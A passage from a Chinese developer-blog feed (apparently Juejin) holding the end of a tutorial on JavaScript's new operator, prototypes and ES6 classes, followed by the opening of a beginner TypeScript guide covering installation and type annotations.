  <span class="hljs-comment">// 3. 创建新对象并设置原型链</span>
  <span class="hljs-keyword">const</span> proto = constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> || <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);

  <span class="hljs-comment">// 4. 绑定 constructor 属性</span>
  obj.<span class="hljs-property">constructor</span> = constructor; 

  <span class="hljs-comment">// 5. 执行构造函数</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(constructor, args, constructor);

  <span class="hljs-comment">// 6. 处理返回值</span>
  <span class="hljs-comment">// Reflect.construct 已经处理了返回值逻辑</span>
  <span class="hljs-comment">// 但我们还是实现自己的逻辑以保持一致</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">processConstructorResult</span>(result, obj, constructor);
}

<span class="hljs-comment">// 辅助函数：检查是否为原生构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isNativeConstructor</span>(<span class="hljs-params">fn</span>) {
  <span class="hljs-comment">// 一些内置构造函数如 Symbol、BigInt 没有 prototype</span>
  <span class="hljs-keyword">const</span> nativeConstructors = [
    <span class="hljs-string">'Number'</span>, <span class="hljs-string">'String'</span>, <span class="hljs-string">'Boolean'</span>, <span class="hljs-string">'Symbol'</span>, <span class="hljs-string">'BigInt'</span>,
    <span class="hljs-string">'Date'</span>, <span class="hljs-string">'RegExp'</span>, <span class="hljs-string">'Error'</span>, <span class="hljs-string">'Array'</span>, <span class="hljs-string">'Object'</span>, <span class="hljs-string">'Function'</span>
  ];

  <span class="hljs-keyword">return</span> nativeConstructors.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span>
    fn.<span class="hljs-property">name</span> === name || fn === globalThis[name]
  );
}

<span class="hljs-comment">// 辅助函数：获取函数名</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getFunctionName</span>(<span class="hljs-params">fn</span>) {
  <span class="hljs-keyword">if</span> (fn.<span class="hljs-property">name</span>) <span class="hljs-keyword">return</span> fn.<span class="hljs-property">name</span>;
  <span class="hljs-keyword">const</span> match = fn.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^function\s*([^\s(]+)/</span>);
  <span class="hljs-keyword">return</span> match ? match[<span class="hljs-number">1</span>] : <span class="hljs-string">'anonymous'</span>;
}

<span class="hljs-comment">// 辅助函数：处理构造函数返回值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processConstructorResult</span>(<span class="hljs-params">result, defaultObj, constructor</span>) {
  <span class="hljs-comment">// 如果 result 是 undefined 或 null，返回 defaultObj</span>
  <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span> defaultObj;
  }

  <span class="hljs-comment">// 检查 result 的类型</span>
  <span class="hljs-keyword">const</span> type = <span class="hljs-keyword">typeof</span> result;

  <span class="hljs-comment">// 如果是对象或函数，返回 result</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'object'</span> || type === <span class="hljs-string">'function'</span>) {
    <span class="hljs-comment">// 额外检查：如果 result 是构造函数本身的实例，确保原型链正确</span>
    <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> constructor) {
      <span class="hljs-keyword">return</span> result;
    }
    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-comment">// 原始值，返回 defaultObj</span>
  <span class="hljs-keyword">return</span> defaultObj;
}
</code></pre>
<h2 data-id="heading-6">深入原型链与继承</h2>
<h3 data-id="heading-7">原型链的建立过程</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 父构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-comment">// 父类方法</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 叫了`</span>;
};
<span class="hljs-comment">// 子构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
}
<span class="hljs-comment">// 建立原型链</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;
<span class="hljs-comment">// 子类方法</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 汪汪叫`</span>;
};
<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'旺财'</span>, <span class="hljs-string">'金毛'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">speak</span>()); <span class="hljs-comment">// 旺财 叫了</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());  <span class="hljs-comment">// 旺财 汪汪叫</span>
</code></pre>
<h3 data-id="heading-8">ES6 类与 new 的关系</h3>
<p>ES6 类的本质还是基于原型的语法糖：</p>
<h4 data-id="heading-9">ES6 基本写法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
  }
}
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'张三'</span>, <span class="hljs-number">30</span>);
</code></pre>
<h4 data-id="heading-10">对应 ES5 的写法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonES5</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// 类构造器中的代码</span>
  <span class="hljs-keyword">if</span> (!(<span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PersonES5</span>)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Class constructor Person cannot be invoked without 'new'"</span>);
  }

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-comment">// 实例方法（添加到原型）</span>
<span class="hljs-title class_">PersonES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
};
<span class="hljs-keyword">const</span> personES5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonES5</span>(<span class="hljs-string">'李四'</span>, <span class="hljs-number">25</span>);
</code></pre>
<h3 data-id="heading-11">类的重要特性</h3>
<ol>
<li>类必须用 new 调用</li>
<li>类方法不可枚举</li>
<li>类没有变量提升</li>
</ol>
<h3 data-id="heading-12">ES6 实现继承的完整示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 叫了'</span>);
  }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">super</span>(name);
  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 汪汪叫'</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">ES6 继承的本质</h4>
<p>ES6 通过 <code>extends</code> 关键字实现继承，就等价于 ES5 的寄生组合继承：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AnimalES5</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">AnimalES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 叫了'</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">DogES5</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-title class_">AnimalES5</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
}

<span class="hljs-comment">// 设置原型链</span>
<span class="hljs-title class_">DogES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AnimalES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">DogES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">DogES5</span>;

<span class="hljs-title class_">DogES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 汪汪叫'</span>);
};
</code></pre>
<h2 data-id="heading-14">特殊场景与高级应用</h2>
<h3 data-id="heading-15">单例模式与 new</h3>
<h4 data-id="heading-16">方法1：使用静态属性</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonV1</span> {
  <span class="hljs-keyword">static</span> instance = <span class="hljs-literal">null</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">SingletonV1</span>.<span class="hljs-property">instance</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">SingletonV1</span>.<span class="hljs-property">instance</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-title class_">SingletonV1</span>.<span class="hljs-property">instance</span> = <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getInstance</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">instance</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingletonV1</span>(name);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">instance</span>;
  }
}
</code></pre>
<h4 data-id="heading-17">方法2：使用闭包</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">SingletonV2</span> = (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
      <span class="hljs-keyword">if</span> (instance) {
        <span class="hljs-keyword">return</span> instance;
      }

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
      instance = <span class="hljs-variable language_">this</span>;
    }
  };
})();
</code></pre>
<h4 data-id="heading-18">方法3：代理模式</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createSingletonProxy</span>(<span class="hljs-params">Class</span>) {
  <span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(<span class="hljs-title class_">Class</span>, {
    <span class="hljs-title function_">construct</span>(<span class="hljs-params">target, args</span>) {
      <span class="hljs-keyword">if</span> (!instance) {
        instance = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(target, args);
      }
      <span class="hljs-keyword">return</span> instance;
    }
  });
}
</code></pre>
<h3 data-id="heading-19">实现 Object.create 的 polyfill</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property">create</span> !== <span class="hljs-string">'function'</span>) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">proto, propertiesObject</span>) {
    <span class="hljs-comment">// 参数验证</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">'object'</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Object prototype may only be an Object or null'</span>);
    }

    <span class="hljs-comment">// 核心实现：使用空函数作为中间构造函数</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"/>) { }
    F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;

    <span class="hljs-comment">// 创建新对象，原型指向proto</span>
    <span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();

    <span class="hljs-comment">// 处理第二个参数（属性描述符）</span>
    <span class="hljs-keyword">if</span> (propertiesObject !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(obj, propertiesObject);
    }

    <span class="hljs-comment">// 处理 null 原型</span>
    <span class="hljs-keyword">if</span> (proto === <span class="hljs-literal">null</span>) {
      obj.<span class="hljs-property">__proto__</span> = <span class="hljs-literal">null</span>;
    }
    <span class="hljs-comment">// 返回新对象</span>
    <span class="hljs-keyword">return</span> obj;
  };
}
</code></pre>
<h2 data-id="heading-20">常见面试问题与解答</h2>
<h3 data-id="heading-21">问题1：new 操作符做了什么？</h3>
<ol>
<li>创建一个新的空对象',</li>
<li>将这个空对象的原型设置为构造函数的 prototype 属性',</li>
<li>将构造函数的 this 绑定到这个新对象，并执行构造函数',</li>
<li>如果构造函数返回一个对象（包括函数），则返回该对象；否则返回新创建的对象</li>
</ol>
<h3 data-id="heading-22">问题2：如果构造函数有返回值会怎样？</h3>
<ul>
<li>返回对象（包括函数）：忽略 this 绑定的对象，返回该对象</li>
<li>返回原始值（number, string, boolean等）：忽略返回值，返回 this 绑定的对象</li>
<li>没有 return 语句：隐式返回 undefined，返回 this 绑定的对象</li>
</ul>
<h3 data-id="heading-23">问题3：如何判断函数是否被 new 调用？</h3>
<ul>
<li>ES5：检查 this instanceof Constructor'</li>
<li>ES6+：使用 new.target（更准确）</li>
<li>箭头函数：不能作为构造函数，没有 new.target</li>
</ul>
<h2 data-id="heading-24">结语</h2>
<p>通过深入理解 new 操作符的工作原理，我们不仅能在面试中脱颖而出，还能在实际开发中做出更明智的设计决策。对于文章中错误的地方或者有任何问题，欢迎在评论区留言讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 核心基础知识]]></title>    <link>https://juejin.cn/post/7605539194690666496</link>    <guid>https://juejin.cn/post/7605539194690666496</guid>    <pubDate>2026-02-13T01:11:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605539194690666496" data-draft-id="7605772919224320034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 核心基础知识"/> <meta itemprop="keywords" content="前端,TypeScript,面试"/> <meta itemprop="datePublished" content="2026-02-13T01:11:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不想秃头的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/2754702534251820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 核心基础知识
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2754702534251820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不想秃头的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:11:10.000Z" title="Fri Feb 13 2026 01:11:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>TypeScript（简称 TS）作为 JavaScript 的超集，已成为前端工程化的标配。它通过静态类型检查，提前规避大量运行时错误，让代码更易维护、更具可读性。本文抛开复杂概念，从新手视角梳理 TS 核心基础知识，看完就能上手写 TS 代码。</p>
<h2 data-id="heading-0">一、为什么要学 TypeScript？</h2>
<p>先明确学习的意义，避免盲目跟风：</p>
<ol>
<li><strong>静态类型检查</strong>：编码阶段发现错误（如类型不匹配、属性不存在），而非运行时崩溃；</li>
<li><strong>更好的代码提示</strong>：VS Code 等编辑器能精准提示变量 / 函数的属性和方法，提升开发效率；</li>
<li><strong>代码可读性提升</strong>：类型注解就是 “自文档”，一眼看懂变量 / 函数的用途；</li>
<li><strong>工程化必备</strong>：Vue3、React、Node.js 主流框架 / 环境均推荐 / 支持 TS，大厂项目标配。</li>
</ol>
<h2 data-id="heading-1">二、TS 环境搭建（快速上手）</h2>
<h3 data-id="heading-2">1. 安装 TypeScript</h3>
<pre><code class="hljs language-js" lang="js"># 全局安装 <span class="hljs-variable constant_">TS</span> 编译器
npm install -g typescript
# 验证安装（查看版本）
tsc -v
</code></pre>
<h3 data-id="heading-3">2. 第一个 TS 程序</h3>
<ul>
<li>
<p>创建 <code>hello.ts</code> 文件：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 类型注解：指定变量类型为字符串</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"Hello TypeScript!"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);
</code></pre>
</li>
<li>
<p>编译 TS 为 JS：</p>
<pre><code class="hljs language-ts" lang="ts"># 将 hello.<span class="hljs-property">ts</span> 编译为 hello.<span class="hljs-property">js</span>
tsc hello.<span class="hljs-property">ts</span>
</code></pre>
</li>
<li>
<p>运行 JS 文件：</p>
<pre><code class="hljs language-ts" lang="ts">node hello.<span class="hljs-property">js</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-4">3. 简化开发：自动编译 + 热更新（可选）</h3>
<pre><code class="hljs language-ts" lang="ts"># 安装 ts-node（直接运行 <span class="hljs-variable constant_">TS</span>，无需手动编译）
npm install -g ts-node
# 直接运行 <span class="hljs-variable constant_">TS</span> 文件
ts-node hello.<span class="hljs-property">ts</span>
</code></pre>
<h2 data-id="heading-5">三、核心基础：类型注解与类型推断</h2>
<h3 data-id="heading-6">1. 类型注解（手动指定类型）</h3>
<p>语法：<code>变量名: 类型 = 值</code>，告诉 TS 变量的具体类型。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基本类型注解</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"张三"</span>; <span class="hljs-comment">// 字符串</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">25</span>; <span class="hljs-comment">// 数字（整数/浮点数/NaN/Infinity）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">isAdult</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 布尔值</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">empty</span>: <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// null</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">undef</span>: <span class="hljs-literal">undefined</span> = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// undefined</span>

<span class="hljs-comment">// 数组注解（两种写法）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr1</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">"苹果"</span>, <span class="hljs-string">"香蕉"</span>]; <span class="hljs-comment">// 推荐</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr2</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span>&gt; = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]; <span class="hljs-comment">// 泛型写法</span>

<span class="hljs-comment">// 对象注解</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">user</span>: { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> } = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"李四"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,
};

<span class="hljs-comment">// 函数注解（参数 + 返回值）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}
</code></pre>
<h3 data-id="heading-7">2. 类型推断（TS 自动推导类型）</h3>
